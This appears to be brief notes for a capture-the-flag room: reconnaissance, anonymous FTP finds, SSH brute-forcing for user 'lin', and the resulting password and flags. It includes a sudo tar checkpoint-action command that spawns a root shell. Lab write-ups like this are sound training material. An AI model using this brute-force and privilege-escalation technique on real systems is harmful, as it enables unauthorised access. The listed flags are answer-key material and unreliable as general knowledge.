gobuster initial directory scan: /images(301), /index.html(200)
/images has only one picture: crew.jpg

nmap initial scan: p21(ftp-anonymous allowed), p22(ssh), p80(http)

ftp has locks.txt and task.txt files
task.txt has the username "lin" mentioned
We can try bruteforce ssh password for lin with this info, use locks.txt file

SSH password for lin: RedDr4gonSynd1cat3

User flag: THM{CR1M3_SyNd1C4T3}

Priv Esc: 

    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Root Flag: THM{80UN7Y_h4cK3r}



